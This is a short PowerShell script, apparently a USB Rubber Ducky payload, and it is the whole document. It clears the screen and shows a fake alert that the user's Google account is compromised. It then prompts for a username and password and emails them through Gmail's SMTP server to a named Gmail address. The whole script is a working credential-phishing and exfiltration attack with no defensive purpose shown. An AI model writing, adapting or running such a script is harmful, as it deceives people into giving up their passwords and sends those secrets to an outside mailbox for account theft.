clear
$mycredentials = Get-Credential
Write-Host "ALERT your google account has been compromised! please enter your credentials for verification"

$name = Read-Host "Username/Email"
$pwd = Read-Host "password"




Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From jaddison0370@gmail.com -To jaddison0370@gmail -Subject 'Hello from the Ducky' -Body ("$name $pwd") -Credential ($mycredentials)
exit
